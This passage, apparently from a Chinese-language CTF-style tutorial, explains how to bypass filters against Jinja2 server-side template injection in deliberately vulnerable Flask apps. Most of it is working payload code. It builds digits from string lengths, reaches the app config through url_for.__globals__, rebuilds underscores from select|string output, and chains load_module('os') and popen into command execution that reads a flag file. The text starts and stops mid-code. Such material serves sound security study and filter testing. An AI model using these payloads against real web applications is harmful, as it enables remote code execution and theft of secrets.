class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> <span class="built_in">any</span>(char.isdigit() <span class="keyword">for</span> char <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这道题目在输入任何数字都会进行报<code>hack!</code>,例如下面payload返回的就是，具体的问题位置是在<code>[122]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123; (<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">122</span>]|attr(<span class="string">&quot;get_data&quot;</span>)(<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>绕过手法是通过<code>&#123;%%&#125;</code>+<code>lenght</code>去设置变量，例如我的数字数据需要两个，一个是122还有一个是0,那么我们就需要构造出两个变量，然后再去执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> a = <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaa&quot;</span>|length*<span class="string">&#x27;aaaaaa&#x27;</span>|length - <span class="string">&#x27;aaaa&#x27;</span>|length %&#125;&#123;% <span class="built_in">set</span> b = false %&#125;&#123;&#123; (<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[a]|attr(<span class="string">&quot;get_data&quot;</span>)(b,<span class="string">&quot;flag&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>然后<code>&quot;aaaaaaaaaaaaaaaaaaaaa&quot;|length*&#39;aaaaaa&#39;|length - &#39;aaaa&#39;|length</code>可以拆分来看<br><code>aaaaaaaaaaaaaaaaaaaaa&quot;|length</code>&#x3D;21 * <code>&#39;aaaaaa&#39;|length</code> &#x3D; 6 - <code>&#39;aaaa&#39;|length</code> &#x3D; 4 相当于<code>21*6-4</code>。</p><h1 id="config过滤绕过"><a href="#config过滤绕过" class="headerlink" title="config过滤绕过"></a>config过滤绕过</h1><p>有些题目会禁用<code>config</code>这个模块，例如这道例题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;% set config=None%&#125;&#123;% set self=None%&#125;&quot;</span> + input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = waf(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>每次访问的时候都会把config设置为<code>None</code>，这种的话可以通过flask的内置加载对象获取，固定的格式，例如下面payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="综合符号过滤绕过"><a href="#综合符号过滤绕过" class="headerlink" title="综合符号过滤绕过"></a>综合符号过滤绕过</h1><p>继续看一道例题，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (</span><br><span class="line">        <span class="string">&quot;_&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;request&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received input:&quot;</span>, raw_str)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这道题目把空格、下划线、单引号、双引号、点、request库全都过滤掉了，下面简单举个可以获取到这些特殊数据的案例，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            空格获取1:&#123;% set a=(&#123;&#125;|select()|string()) %&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            空格获取2:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            空格获取3:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a[10]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            下划线获取:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a[24]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            百分号获取1:&#123;% set a=(&#123;&#125;|string|urlencode) %&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            百分号获取2:&#123;% set a=(&#123;&#125;|string|urlencode|list) %&#125;&#123;&#123;a[0]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>select是输出对象的信息，然后通过string转换字符串，再通过list转换列表，在拿去数据的时候会很方便。这部分学会之后就可以开始上面的例题了，我们可以使用下面的payload模板去进行绕过，需要用到<code>_frozen_importlib.BuiltinImporter</code>模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;type flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体绕过后的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhx1=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhx=(xhx1[<span class="number">24</span>],xhx1[<span class="number">24</span>])|join %&#125;&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=<span class="number">1</span>)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=<span class="number">1</span>)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=<span class="number">1</span>)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=<span class="number">1</span>)|join),xhx1[<span class="number">24</span>],(<span class="built_in">dict</span>(module=<span class="number">1</span>)|join))|join %&#125;&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=<span class="number">1</span>)|join %&#125;&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=<span class="number">1</span>)|join %&#125;&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=<span class="number">1</span>)|join,xhx)|join %&#125;&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=<span class="number">1</span>)|join,kg[<span class="number">10</span>],<span class="built_in">dict</span>(flag=<span class="number">1</span>)|join)|join%&#125;&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=<span class="number">1</span>)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(<span class="number">108</span>)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>为了更好的理解，这里拆解一下放出来，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx1=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(xhx1[<span class="number">24</span>],xhx1[<span class="number">24</span>])|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=<span class="number">1</span>)|join),xhx1[<span class="number">24</span>],(<span class="built_in">dict</span>(module=<span class="number">1</span>)|join))|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=<span class="number">1</span>)|join,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=<span class="number">1</span>)|join,kg[<span class="number">10</span>],<span class="built_in">dict</span>(flag=<span class="number">1</span>)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(<span class="number">108</span>)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>还有一些比较通用的这里我也把代码给出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            下划线1: &#123;% set xhx1=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;xhx1[24]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            下划线1: &#123;% set xhx1=(&#123;&#125;|select()|string())|list|list %&#125;&#123;&#123;xhx1&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            下划线2: &#123;% set xhx=(xhx1[24],xhx1[24])|join %&#125;&#123;&#123;xhx&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            空格: &#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;kg[10]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            cls:&#123;% set cls=(xhx,(dict(class=1)|join),xhx)|join %&#125;&#123;&#123;cls&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            base:&#123;% set base=(xhx,(dict(base=1)|join),xhx)|join %&#125;&#123;&#123;base&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            subclasses:&#123;% set subclasses=(xhx,(dict(subclasses=1)|join),xhx)|join %&#125;&#123;&#123;subclasses&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            getitem:&#123;% set getitem=(xhx,dict(getitem=1)|join,xhx)|join %&#125;&#123;&#123;getitem&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            init:&#123;% set init=(xhx,dict(init=1)|join,xhx)|join %&#125;&#123;&#123;init&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            globals:&#123;% set globals=(xhx,dict(globals=1)|join,xhx)|join %&#125;&#123;&#123;globals&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            builtins: &#123;% set builtins=(xhx,dict(builtins=1)|join,xhx)|join %&#125;&#123;&#123;builtins&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure><h1 id="综合符号加数字过滤绕过"><a href="#综合符号加数字过滤绕过" class="headerlink" title="综合符号加数字过滤绕过"></a>综合符号加数字过滤绕过</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (</span><br><span class="line">        <span class="string">&quot;_&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;]&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="built_in">any</span>(char.isdigit() <span class="keyword">for</span> char <span class="keyword">in</span> input_str)</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;request&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received input:&quot;</span>, raw_str)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个在上一道题目的基础上增加了中括号，纯数字过滤，中括号可以采用<code>attr(__getitem__)(*)</code>去解决，但是因为<code>_</code>无法直接获取，在获取<code>_</code>过程中就需要使用数组，所以这里<code>__getitem__</code>需要用<code>pop</code>，他的作用和<code>__getitem__</code>基本一样但是他会把数据永久性弹出需要注意，然后dict的value可以换成单个字符，还有就是数字，数字索引一共没多少直接用lenght去生成即可。具体payload模板采用上面的基础上进行修改，模板如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx1=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(xhx1[<span class="number">24</span>],xhx1[<span class="number">24</span>])|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=<span class="number">1</span>)|join),xhx1[<span class="number">24</span>],(<span class="built_in">dict</span>(module=<span class="number">1</span>)|join))|join 